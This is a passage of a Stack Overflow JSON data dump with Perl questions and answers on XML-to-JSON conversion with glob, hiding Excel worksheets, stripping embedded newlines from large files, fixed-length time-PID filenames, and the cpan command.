2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485871760, "post_id": 41959237, "comment_id": 71097960, "body": "isn&#39;t simple :). I&#39;ll amend."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 1, "user_id": 4987072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd76e7d810fc33b11fd0727a37cf8168?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Mishin", "link": "https://stackoverflow.com/users/4987072/ivan-mishin"}, "edited": false, "score": 0, "creation_date": 1485872486, "post_id": 41959237, "comment_id": 71098497, "body": "Have you ever run a phrase through an online translator and back again? And had it come out nonsense? That&#39;s what you&#39;re trying to do here. To solve your problem, you need to think about what your problem <i>actually is</i>. What needs to be in your output JSON, and what input do you need to process to get it. And then write a solution to <i>that</i> problem, rather than a generic &#39;XML-to-JSON&#39; converter, which cannot ever work."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 2, "last_activity_date": 1485871801, "last_edit_date": 1495540890, "creation_date": 1485870498, "answer_id": 41959237, "question_id": 41959111, "link": "https://stackoverflow.com/questions/41959111/how-to-perl-convert-xml-name-with-pattern-to-json/41959237#41959237", "title": "How to perl convert xml (name with pattern) to json?", "body": "<p>There's problems with what you're trying to do:</p>\n\n<ol>\n<li><code>XML::Simple</code> isn't simple. It's <em>for</em> simple XML. It'll mangle your XML and give inconsistent results. See: <a href=\"https://stackoverflow.com/questions/33267765/why-is-xmlsimple-discouraged\">Why is XML::Simple &quot;Discouraged&quot;?</a></li>\n<li><code>XML</code> is fundamentally more complicated than <code>JSON</code>, so there's no linear transformation. You need to figure out what'd you'd do with attributes and duplicate elements for a start. </li>\n<li><code>File does not exist: /tmp/test-*.xml at -e line 1</code> - means the file doesn't exist. So you're not going to get very far. But <code>XMLin</code> doesn't accept wildcards. You'll have to process one file at a time. </li>\n</ol>\n\n<p>The first two points are solvable, provided you accept that this cannot be a generic solution - to give a moderately general solution, we'll need an example of your source XML. But it won't be a one liner. </p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1485882418, "creation_date": 1485882418, "answer_id": 41963405, "question_id": 41959111, "link": "https://stackoverflow.com/questions/41959111/how-to-perl-convert-xml-name-with-pattern-to-json/41963405#41963405", "title": "How to perl convert xml (name with pattern) to json?", "body": "<p>You seem to be asking how to find files matching a file glob. </p>\n\n<p>You could use</p>\n\n<pre><code>my @qfns = glob(\"/tmp/test-*.xml\");\n</code></pre>\n\n<p>If you just want the first matching file, use</p>\n\n<pre><code>my ($qfn) = glob(\"/tmp/test-*.xml\");\n</code></pre>\n\n<p>Do not use the following since <code>glob</code> acts an iterator in scalar context.</p>\n\n<pre><code>my $qfn = glob(\"/tmp/test-*.xml\");  # XXX\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 46, "user_id": 691584, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0fb1ddfe07aa4245fa68c200c6f388d1?s=128&d=identicon&r=PG", "display_name": "Mohan Gutta", "link": "https://stackoverflow.com/users/691584/mohan-gutta"}, "is_accepted": false, "score": 0, "last_activity_date": 1485936016, "creation_date": 1485936016, "answer_id": 41974627, "question_id": 41959111, "link": "https://stackoverflow.com/questions/41959111/how-to-perl-convert-xml-name-with-pattern-to-json/41974627#41974627", "title": "How to perl convert xml (name with pattern) to json?", "body": "<p>You can try this using <code>glob</code> and <code>map</code> functions.</p>\n\n<pre><code>perl -MJSON::Any -MXML::Simple -le'local $,=\"\\n\"; print map { JSON::Any-&gt;new()-&gt;objToJson(XMLin($_)) } glob \"/path/to/my/test*.xml\"'\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 4987072, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd76e7d810fc33b11fd0727a37cf8168?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Mishin", "link": "https://stackoverflow.com/users/4987072/ivan-mishin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 263, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1485936016, "creation_date": 1485870170, "question_id": 41959111, "link": "https://stackoverflow.com/questions/41959111/how-to-perl-convert-xml-name-with-pattern-to-json", "title": "How to perl convert xml (name with pattern) to json?", "body": "<p>The next convert test.xml to json:</p>\n\n<pre><code>perl -MJSON::Any -MXML::Simple -le'print JSON::Any-&gt;new()-&gt;objToJson(XMLin(\"/tmp/test.xml \"))'\n</code></pre>\n\n<p>but I need convert any xml (example test-1.xml test-2.xml test-3.xml test-4.xml etc) with pattern name /tmp/test-*.xml, but if I use:</p>\n\n<pre><code>perl -MJSON::Any -MXML::Simple -le'print JSON::Any-&gt;new()-&gt;objToJson(XMLin(\"/tmp/test-*.xml \"))'\n</code></pre>\n\n<p>I have the next messages:</p>\n\n<blockquote>\n  <p>File does not exist: /tmp/test-*.xml  at -e line 1</p>\n</blockquote>\n\n<p>How I do it?</p>\n"}, {"tags": ["linux", "excel", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1485869776, "post_id": 41958950, "comment_id": 71096631, "body": "Is the order of the tabs related to when the worksheets are created? Can you provide a full <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> that includes creating a file and adding sheets please?"}, {"owner": {"reputation": 1190, "user_id": 7410353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92df7e8954b8a6ed2a580c9dbec0cd70?s=128&d=identicon&r=PG&f=1", "display_name": "Svekke", "link": "https://stackoverflow.com/users/7410353/svekke"}, "edited": false, "score": 0, "creation_date": 1485870017, "post_id": 41958950, "comment_id": 71096803, "body": "And if you activate the third a second time after hiding the first??"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1485870327, "post_id": 41958950, "comment_id": 71097004, "body": "No need <code>$worksheet3-&gt;activate()</code> since the two sheet hidden then there is no option instead the third one."}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1485870426, "post_id": 41958950, "comment_id": 71097069, "body": "Yes. This is the issue don&#39;t use <code>$worksheet3-&gt;activate()</code>."}, {"owner": {"reputation": 759, "user_id": 6932839, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/62p5n.jpg?s=128&g=1", "display_name": "arnpry", "link": "https://stackoverflow.com/users/6932839/arnpry"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 0, "creation_date": 1485870822, "post_id": 41958950, "comment_id": 71097309, "body": "Right @toolic. My thinking was setting the third worksheet as the default before hiding the first two but, apparently that won&#39;t work. Pretty stuck at the moment."}, {"owner": {"reputation": 759, "user_id": 6932839, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/62p5n.jpg?s=128&g=1", "display_name": "arnpry", "link": "https://stackoverflow.com/users/6932839/arnpry"}, "edited": false, "score": 0, "creation_date": 1485870837, "post_id": 41958950, "comment_id": 71097322, "body": "Also, I have the latest version of the module."}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485871226, "post_id": 41959410, "comment_id": 71097613, "body": "So you&#39;re saying move the <code>activate</code> to the bottom?"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485871265, "post_id": 41959410, "comment_id": 71097630, "body": "Obliviously and the same has been tested."}, {"owner": {"reputation": 759, "user_id": 6932839, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/62p5n.jpg?s=128&g=1", "display_name": "arnpry", "link": "https://stackoverflow.com/users/6932839/arnpry"}, "edited": false, "score": 0, "creation_date": 1485871451, "post_id": 41959410, "comment_id": 71097760, "body": "This worked perfectly and I have marked it as my answer. Thanks for all of the help @ssr1012!"}], "tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": true, "score": 1, "last_activity_date": 1485871077, "creation_date": 1485871077, "answer_id": 41959410, "question_id": 41958950, "link": "https://stackoverflow.com/questions/41958950/hide-multiple-excel-worksheets/41959410#41959410", "title": "Hide Multiple Excel Worksheets", "body": "<pre><code># Sheet2 won't be visible until it is unhidden in Excel.\n$worksheet1-&gt;hide();\n$worksheet2-&gt;hide();\n</code></pre>\n\n<blockquote>\n  <p>Please activate the excel after the hidden sheets.</p>\n</blockquote>\n\n<pre><code>$worksheet3-&gt;activate();\n</code></pre>\n\n<p>I have tested this.</p>\n"}], "owner": {"reputation": 759, "user_id": 6932839, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/62p5n.jpg?s=128&g=1", "display_name": "arnpry", "link": "https://stackoverflow.com/users/6932839/arnpry"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 81, "favorite_count": 0, "accepted_answer_id": 41959410, "answer_count": 1, "score": 0, "last_activity_date": 1485871077, "creation_date": 1485869654, "last_edit_date": 1485870085, "question_id": 41958950, "link": "https://stackoverflow.com/questions/41958950/hide-multiple-excel-worksheets", "title": "Hide Multiple Excel Worksheets", "body": "<p>I am using the Perl module <a href=\"http://p3rl.org/Excel::Writer::XLSX\" rel=\"nofollow noreferrer\">Excel::Writer::XLSX</a> to write an Excel workbook in Linux. I am writing to three separate worksheets and am trying to hide the first two so that only the third worksheet is visible.</p>\n\n<p><strong>Perl Code:</strong></p>\n\n<pre><code>$worksheet3-&gt;activate();\n$worksheet1-&gt;hide();\n$worksheet2-&gt;hide();\n</code></pre>\n\n<p>Instead, using the code below, only the first worksheet tab is being hidden.</p>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["bash", "perl", "unix"], "comments": [{"owner": {"reputation": 6351, "user_id": 3498962, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9tW.jpg?s=128&g=1", "display_name": "Essex Boy", "link": "https://stackoverflow.com/users/3498962/essex-boy"}, "edited": false, "score": 2, "creation_date": 1485868355, "post_id": 41958497, "comment_id": 71095645, "body": "what do you want to do with it?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1485869131, "post_id": 41958497, "comment_id": 71096166, "body": "Are you sure the command worked? No backslash before the vertical bar? Newline and double quote removed? What output do you expect?"}, {"owner": {"reputation": 1248, "user_id": 1542307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BXRAC.jpg?s=128&g=1", "display_name": "Karan Shah", "link": "https://stackoverflow.com/users/1542307/karan-shah"}, "edited": false, "score": 0, "creation_date": 1485870921, "post_id": 41958497, "comment_id": 71097380, "body": "use sed like the answer I&#39;ve given, should be very fast"}], "answers": [{"comments": [{"owner": {"reputation": 1248, "user_id": 1542307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BXRAC.jpg?s=128&g=1", "display_name": "Karan Shah", "link": "https://stackoverflow.com/users/1542307/karan-shah"}, "edited": false, "score": 0, "creation_date": 1485870432, "post_id": 41958822, "comment_id": 71097083, "body": "Also, using Notepad++ to replace a file that huge wouldn&#39;t be recommended."}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1485873746, "post_id": 41958822, "comment_id": 71099407, "body": "Also, your suggestion is not an answer to the OP&#39;s question."}], "tags": [], "owner": {"reputation": 58, "user_id": 7494554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0ed12177ac7f1ba52ae06ec3e5935771?s=128&d=identicon&r=PG&f=1", "display_name": "Kaushik Thakrar", "link": "https://stackoverflow.com/users/7494554/kaushik-thakrar"}, "is_accepted": false, "score": -1, "last_activity_date": 1485869579, "last_edit_date": 1485869579, "creation_date": 1485869231, "answer_id": 41958822, "question_id": 41958497, "link": "https://stackoverflow.com/questions/41958497/how-to-remove-newline-breaks-in-fields-in-unix-file-without-using-perl/41958822#41958822", "title": "How to remove newline breaks in fields in Unix file without using perl", "body": "<p>I would use Notepad++ Replace function (\\r\\n\\r\\n and replace it with \\r\\n).</p>\n\n<p>If you haven't it, you can download Notepad++ for free and is very useful application and has many uses.</p>\n\n<p>At the View menu select Show Symbol and check on Show All Characters.</p>\n\n<p>Press Cntrl+H or click on Search Menu and select Replace... option\nType in \\r\\n\\r\\n at Find what: \nType in \\r\\n at Replace it with\nClick on Replace All button.</p>\n\n<p>PS: The Text you have supplied is not just LF, it is CRLF which is \\r\\n. You can try your method. Remember you want to just replace CRLFCRLF with one CRLF, otherwise you will loose all your CRLF and all your text will appear in one line.</p>\n"}, {"tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": false, "score": 1, "last_activity_date": 1485871951, "last_edit_date": 1485871951, "creation_date": 1485870100, "answer_id": 41959094, "question_id": 41958497, "link": "https://stackoverflow.com/questions/41958497/how-to-remove-newline-breaks-in-fields-in-unix-file-without-using-perl/41959094#41959094", "title": "How to remove newline breaks in fields in Unix file without using perl", "body": "<p>The reason of segmentation fault is your are enable the slurp mode. Don't do that. Instead read the file line by line.</p>\n\n<p>Try this</p>\n\n<pre><code>perl -lne 'my $nxt_line = &lt;&gt;;($nxt_line=~m/^\"\\|\"/)?print \"$_$nxt_line\":print \"$_\"' file.txt\n</code></pre>\n\n<p>In above script <code>$nxt_line</code> will store the next line of the file.. Then make the pattern match for to do it.</p>\n"}, {"tags": [], "owner": {"reputation": 1248, "user_id": 1542307, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BXRAC.jpg?s=128&g=1", "display_name": "Karan Shah", "link": "https://stackoverflow.com/users/1542307/karan-shah"}, "is_accepted": false, "score": 0, "last_activity_date": 1485870851, "creation_date": 1485870851, "answer_id": 41959338, "question_id": 41958497, "link": "https://stackoverflow.com/questions/41958497/how-to-remove-newline-breaks-in-fields-in-unix-file-without-using-perl/41959338#41959338", "title": "How to remove newline breaks in fields in Unix file without using perl", "body": "<p>Try this! Should work like a charm!</p>\n\n<pre><code>sed -e ':a' -e 'N' -e '$!ba' -e 's/\\n\"/\"/g' input_file &gt; output_file\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 7495112, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/762c2c482588268ce3bc9edc39e128a2?s=128&d=identicon&r=PG&f=1", "display_name": "Roshni", "link": "https://stackoverflow.com/users/7495112/roshni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1485871951, "creation_date": 1485868254, "last_edit_date": 1485869076, "question_id": 41958497, "link": "https://stackoverflow.com/questions/41958497/how-to-remove-newline-breaks-in-fields-in-unix-file-without-using-perl", "title": "How to remove newline breaks in fields in Unix file without using perl", "body": "<p>I have a file which has newline breaks in one of the fields.\neg: \nSee third line :</p>\n\n<pre><code>\"A\"|\"USD\"|\"123\"|\"AIRPROMOTION\"|\"EXPIRE\"\n\n\"B\"|\"USD\"|\"456\"|\"AIRPROMOTION\"|\"EXPIRE\"\n\n\"C\"|\"USD\"|\"789\n\"|\"AIRPROMOTION\"|\"EXPIRE\"    \n</code></pre>\n\n<p>I tried the command <code>perl -p00e 's/\\n\"|//g'</code> which worked just fine for a small file.But my file is huge (~100MB) and it gives 'Segmentation fault' error.\nWhat are the other options? </p>\n"}, {"tags": ["perl", "substr"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485864728, "post_id": 41955684, "comment_id": 71093163, "body": "This smells like an <code>XY problem</code> - what are you trying to accomplish? Timestamp is a file-metadata, so you don&#39;t need to include it in the filename. And <code>pid</code> is <i>usually</i> a uniqueness thing. So ... why not use <code>Data::UUID</code> or <code>File::Temp</code> instead?"}, {"owner": {"reputation": 11, "user_id": 5760715, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KeCnS.png?s=128&g=1", "display_name": "Bruce", "link": "https://stackoverflow.com/users/5760715/bruce"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485914330, "post_id": 41955684, "comment_id": 71119809, "body": "My constraint is that this web site and Perl scripts system was developed in the late 90&#39;s, to create a guaranteed unique filename. Thus the time-in-seconds plus a PID-number. The name has no particular significance itself. Since there are many script functions and HTML coded pages that expect this filename form, and cannot handle the filename if the PID portion is longer than 5 digits, I am stuck with making it work.      I do not have the authorization from mgnt team (of the parent nonprofit) to recode the entire site. So -- gotta make it work as best I can."}, {"owner": {"reputation": 11, "user_id": 5760715, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KeCnS.png?s=128&g=1", "display_name": "Bruce", "link": "https://stackoverflow.com/users/5760715/bruce"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485914787, "post_id": 41955684, "comment_id": 71119929, "body": "Plus already existing on the current production website are thousands of data files using this name form.   Was a valid question to raise though, wish the original coders had been a bit more expansive in their thinking on this."}], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1485864866, "post_id": 41956441, "comment_id": 71093241, "body": "This is probably how I&#39;d tackle it, given the constraints. Although, I think I&#39;d probably look at <i>not</i> using &quot;time-pid&quot; filenames, and instead use <code>Data::UUID</code> or <code>File::Temp</code> depending on specific use case."}, {"owner": {"reputation": 11, "user_id": 5760715, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KeCnS.png?s=128&g=1", "display_name": "Bruce", "link": "https://stackoverflow.com/users/5760715/bruce"}, "edited": false, "score": 0, "creation_date": 1485914909, "post_id": 41956441, "comment_id": 71119950, "body": "That looks interesting and I will give it a look-see.  Though, My test script might have misled you all, as I have it go through 7 tries because I wanted to make sure that the substr (or whatever command) was working for all cases of different PID length encountered.  In real-life the live full script will only be creating one file name at a time.  Thus will only run once per filename data creation.  So I will check it from that perspective. Thx."}, {"owner": {"reputation": 11, "user_id": 5760715, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KeCnS.png?s=128&g=1", "display_name": "Bruce", "link": "https://stackoverflow.com/users/5760715/bruce"}, "edited": false, "score": 0, "creation_date": 1485923325, "post_id": 41956441, "comment_id": 71122041, "body": "I think I&#39;ve finally wrapped my head around the modulo operation (took a bit). So by subtracting (so to speak) as many 100,000 chunks as possible from the PID value, we will end up with the remainder which will always be less than 100,000. that is, it will be a max value of 99,999 which is 5 digits. And thus gives us the rightmost 5 digits of any length PID. wow, interesting. I never would have thought to go at it that way. I was attempting string character position manipulation.   I will create some test scripts and check them on my parallel dev system.   Get back to you later. thx. :)"}], "tags": [], "owner": {"reputation": 6731, "user_id": 725163, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/Kgxeq.jpg?s=128&g=1", "display_name": "e.dan", "link": "https://stackoverflow.com/users/725163/e-dan"}, "is_accepted": false, "score": 5, "last_activity_date": 1485862224, "creation_date": 1485862224, "answer_id": 41956441, "question_id": 41955684, "link": "https://stackoverflow.com/questions/41955684/perl-substr-to-create-fixed-length-filename-from-time-and-pid/41956441#41956441", "title": "Perl substr to create fixed length filename from time and PID", "body": "<p>I'd use <code>sprintf</code> and modulo, like this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nwhile (&lt;DATA&gt;) {\n        chomp;\n        my $pid = $_;\n        my $time = time;\n        my $fn = sprintf(\"%s-%05d\", $time, $pid % 100000);\n        print \"$fn\\n\";\n}\n__DATA__\n1\n12\n123\n12345\n123456\n7654321\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1485862025-00001\n1485862025-00012\n1485862025-00123\n1485862025-12345\n1485862025-23456\n1485862025-54321\n</code></pre>\n\n<p>Does this meet your needs?</p>\n"}], "owner": {"reputation": 11, "user_id": 5760715, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KeCnS.png?s=128&g=1", "display_name": "Bruce", "link": "https://stackoverflow.com/users/5760715/bruce"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 184, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1485862302, "creation_date": 1485859878, "question_id": 41955684, "link": "https://stackoverflow.com/questions/41955684/perl-substr-to-create-fixed-length-filename-from-time-and-pid", "title": "Perl substr to create fixed length filename from time and PID", "body": "<p>I'd love some assistance or a 'second pair of eyes' on this small code project.\nI am responsible for fixing up some old Perl code, which will be running on a new web server.\nThe code takes the time in seconds (since 1970), concatenates a dash, concatenates the server process ID number to create a variable length file name. And then uses that file and name in a lot of downstream processes.</p>\n\n<p>Filename create code is:  $output_file = \"$time-$$\";</p>\n\n<p>The problem I have is that the on the new server, the PID can be up to 6 (or 7?) digits, while the old server never saw more than 5 digit PID. And the rest of the downstream perl scripts all expect a maximum of 5 digits in that PID file name portion (programs quit ungracefully when encounters 6 digits in the PID part of file name).</p>\n\n<p>So what I am trying to accomplish is end up with a Filename which will always be a fixed length of 16 characters. Composed of the 10 digit time code, a dash, and a 5 digit PID number (the rightmost 5 digits if PID is > 5 chars).</p>\n\n<p>I tried creating a Perl testing script to see if I could work on the PID data value.\n (a) Use the substr command to trim back the PID data to 5 if it is 6 or 7 digit chars,\n (b) or increase to 5 chars with leading zeros if less than 5, again using the substr command.\nThe (a) case of making it shorter seems to work OK,\nBut the (b) case of trying to make it larger acts inconsistently on the server.</p>\n\n<p>I'd like to avoid grep and regular expressions if at all possible.\nAnything which will be hard for me or other support folks to decipher later on will not be useful.</p>\n\n<p>My test script is structured as it is to allow me to ensure that all my test cases will generate proper expected results. (And I may be doing something totally wrong/dumb with it...)</p>\n\n<p>I am pasting in:\n(a) my test script, (b) a screen snap of the server results.\nThe Server PERL Version: 5.10.1</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\n# \n# Name: testsubstr2.pl\n# \nmy $pidnum7 = \"1234567\";\nmy $pidnum6 = \"123456\";\nmy $pidnum5 = \"12345\";\nmy $pidnum4 = \"1234\";\nmy $pidnum3 = \"123\";\nmy $pidnum2 = \"12\";\nmy $pidnum1 = \"1\";\n\nif ( length( $pidnum7 ) == 7 )\n{ print \"This is 7 char PIDnum7. Length = \", length( $pidnum7 ), \", Content: \", $pidnum7, \"\\n\";\n my $subst7  = substr ($pidnum7, -5, 5);\n print \"  Now shortened as SUBst7 to: \", length($subst7), \", Content: \", $subst7, \"\\n\";\n print \"  Orig PIDnum7 is length: \", length($pidnum7), \", Content: \", $pidnum7, \"\\n\";\n}\nelse { } # do nothing\n# this 7 down to 5 seems to work ok.\n\n#elsif ( length( $pidnum6 ) == 6 )\nif ( length( $pidnum6 ) == 6 )\n# else the string is 6 (or less)\n{ print \"This is 6 char PIDnum6. Length = \", length( $pidnum6 ), \", Content: \", $pidnum6, \"\\n\";\n my $subst6  = substr ($pidnum6, -5, 5);\n print \"  Now  shortened as SUBst6 to: \", length($subst6), \", Content: \", $subst6, \"\\n\";\n print \"  Orig PIDnum6 is length: \", length($pidnum6), \", Content: \", $pidnum6, \"\\n\";\n}\nelse { } # do nothing\n# this 6 down to 5 seems to work ok.\n\n#elsif ( length( $pidnum5 ) == 5 )\nif ( length( $pidnum5 ) == 5 )\n# else the string is exactly 5, do nothing\n{ print \"This PIDnum5 is exactly 5 char PIDnum, Length = \", length( $pidnum5 ), \", Content: \", $pidnum5, \"\\n\";\n}\nelse { } # do nothing. Fine as is.\n\n#elsif ( length( $pidnum4 ) == 4 )\nif ( length( $pidnum4 ) == 4 )\n# else the string is 4, too short\n{ print \"This is 4 char PIDnum4. Length = \", length( $pidnum4 ), \", Content: \", $pidnum4, \"\\n\";\n my $subst4  = substr ($pidnum4, 0, 0, \"0\");   #insert character '0' in front\n print \"  After substr command, PIDnum4 = \", length($pidnum4), \", Content: \", $pidnum4, \"\\n\";\n print \"  Now PID4 in variable SUBst4 is length: \", length($subst4), \", Content: \", $subst4, \"\\n\";\n# Weird Result in this code block, the var $pidnum4 becomes 5 chars, 01234, though it should not have changed\n# but the temp var $subst4 becomes 0 charcters with Blank (no) content. It should I thought become the 5 character receiver.\n# something wrong with this block of code.\n}\nelse { } # do nothing\n</code></pre>\n\n<p>Here is a Snaggy link to my test script run <a href=\"https://snag.gy/UaTGIZ.jpg\" rel=\"nofollow noreferrer\" title=\"server test results\">server test results</a></p>\n\n<p>(The bottom 7 lines on result screen are from some generic substr command examples which I included in my test script, probably not needed so I left them out of my code example above.)</p>\n\n<p>Thank you.</p>\n"}, {"tags": ["windows", "perl", "cpan", "cpanm"], "answers": [{"tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": false, "score": 2, "last_activity_date": 1485852651, "creation_date": 1485852651, "answer_id": 41953206, "question_id": 41953111, "link": "https://stackoverflow.com/questions/41953111/cpan-vs-mcpan-perl/41953206#41953206", "title": "cpan vs -MCPAN - Perl", "body": "<p>cpan on Windows just calls <code>App::Cpan-&gt;run( @ARGV )</code>, which should give you the same shell as the other command, maybe with other settings active. But I think it's the same. So you could use both. I prefer just <code>cpan</code> and then do <code>install Name::Module</code>, since I tend to look if it's installed before and which version in the cpan shell beforehand.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 6, "last_activity_date": 1485875677, 